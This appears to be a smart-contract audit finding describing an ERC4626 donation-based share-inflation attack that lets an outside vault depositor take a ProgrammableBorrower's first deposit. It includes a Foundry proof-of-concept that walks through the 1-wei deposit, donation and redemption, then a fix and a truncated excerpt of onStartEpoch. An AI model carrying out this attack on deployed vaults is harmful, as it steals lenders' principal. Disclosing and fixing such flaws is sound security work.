### Title

Unchecked ERC4626 share issuance lets an external vault depositor seize programmable-borrower principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary

`ProgrammableBorrower` deposits pool principal into a general ERC4626 vault but ignores the number of shares returned. When the configured vault is empty and susceptible to donation-based share-price inflation, an ordinary vault depositor can become the first shareholder, donate enough underlying to make the programmable borrower's `N`-asset deposit mint zero or negligible shares, and redeem their own shares for the donated assets plus the programmable borrower's deposit.

### Finding Description

`ProgrammableBorrower` validates only that the configured vault uses the same asset and grants it unlimited underlying allowance; it does not require a minimum share output or protected initial liquidity. [1](#0-0) 

During `IdleCDOEpochVariant.startEpoch`, the CDO first transfers surplus pool assets to the configured borrower and then invokes `onStartEpoch` when programmable-borrower mode is enabled. [2](#0-1) [3](#0-2) 

`onStartEpoch` snapshots `startAssets` as cash plus the current vault position, then deposits all on-hand cash through `_depositToVault`. [4](#0-3) 

`_depositToVault` receives the minted share count but discards it, and `epochStartVaultAssets` is already based on the pre-deposit asset amount rather than the value actually represented by received shares. [5](#0-4) [6](#0-5) 

In a naive ERC4626 implementation whose assets are measured from token balance, an attacker can deposit `1` wei, donate `D` underlying, and cause the programmable borrower's deposit of `N` to mint `floor(N / (1 + D))` shares. For `D >= N`, the result is zero shares, while the pool's assets remain inside the vault and are redeemable by the attacker's sole share. The ERC4626 interface used here places no minimum-share or donation-isolation requirement on `deposit`. [7](#0-6) 

The later accounting baseline still treats the full pre-deposit `N` as epoch principal because `epochStartVaultAssets = startAssets`; `_vaultNetInterest` will subsequently see the position as a loss rather than detect that the deposit was never economically credited to the programmable borrower. [8](#0-7) [9](#0-8) 

### Impact Explanation

An external vault user can steal approximately the entire first programmable-borrower vault deposit, up to all idle pool principal forwarded during `startEpoch`. For a deposit of `N`, the attacker's cost is `1 + D` underlying and their redemption proceeds are approximately `1 + D + N`, producing profit `N`. This breaks the fair-mint and solvency invariants: tranche holders retain strategy-token claims, but the programmable borrower holds no meaningful vault shares backing those claims. If a withdrawal request is outstanding, `epochPendingWithdraws` may prevent the borrower from drawing the trapped liquidity, but it does not prevent the attacker from taking the vault shares' redemption value. [10](#0-9) [11](#0-10) 

### Likelihood Explanation

Likelihood is deployment-dependent. The attack requires the configured ERC4626 vault to have no economically meaningful existing share supply, calculate assets from raw token balance or another donation-sensitive measure, and allow public deposits before the programmable borrower's first deposit. Those conditions are realistic for a newly created or freshly configured ERC4626 integration, while a mature vault with substantial virtual assets or donation-isolated accounting is not exploitable through this path. No privileged attacker action is required: the attacker only makes an ordinary vault deposit, a direct asset transfer, and a normal share redemption around an honest manager's `startEpoch` call. [5](#0-4) [12](#0-11) 

### Recommendation

Require a nonzero and bounded-slippage share output for every vault deposit. For example, accept a `minShares` parameter derived from `previewDeposit` immediately before depositing, or enforce that `vault.previewDeposit(amount)` and the returned `shares` exceed a configured minimum before calling `deposit`. The transaction should revert if `shares == 0` or if `vault.convertToAssets(shares)` is materially below the deposited principal.

Additionally, initialize new programmable-borrower vault integrations with protected seed liquidity before enabling pool deposits, and prefer ERC4626 implementations with virtual-share/virtual-asset offsets or donation-isolated internal accounting.

### Proof of Concept

The following Foundry scenario assumes forked production CDO/strategy addresses and an empty donation-sensitive ERC4626 vault already configured as the programmable borrower's `vault`.

```solidity
function testVaultInflationStealsFirstProgrammableDeposit() external {
    // Forked production contracts and honest roles.
    address attacker = makeAddr("attacker");
    address lender = makeAddr("lender");
    uint256 depositAmount = 1_000_000e6;

    deal(address(underlying), attacker, depositAmount + 1);
    deal(address(underlying), lender, depositAmount);
    underlying.approve(address(cdo), type(uint256).max);

    // Seed the pool in buffer phase, before the epoch starts.
    vm.prank(lender);
    cdo.depositAA(depositAmount);

    // First-depositor inflation against the configured ERC4626 vault.
    // Requires vault.totalAssets() to include the direct donation.
    vm.startPrank(attacker);
    underlying.approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);
    underlying.transfer(address(vault), depositAmount);
    vm.stopPrank();

    // Honest manager starts the epoch. IdleCDOEpochVariant transfers the pool's
    // idle cash to ProgrammableBorrower, which deposits it into the vault.
    vm.prank(manager);
    cdo.startEpoch();

    // With totalAssets ~= 1 + N and supply == 1, depositing N mints zero shares
    // in a naive floor-rounding ERC4626.
    assertEq(vault.balanceOf(address(programmableBorrower)), 0);

    // The attacker's sole share redeems donation + seed + pool principal.
    uint256 before = underlying.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);
    uint256 profit = underlying.balanceOf(attacker) - before;

    // Attacker recovers their cost plus the lender's principal.
    assertEq(profit, depositAmount + 1 + depositAmount);
    assertEq(vault.totalAssets(), 0);
}
```

If the deployed vault returns a small nonzero share count rather than zero, increase the donation until `convertToAssets(returnedShares)` is negligible relative to the deposit; the same missing slippage check still permits nearly all principal to be captured.

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
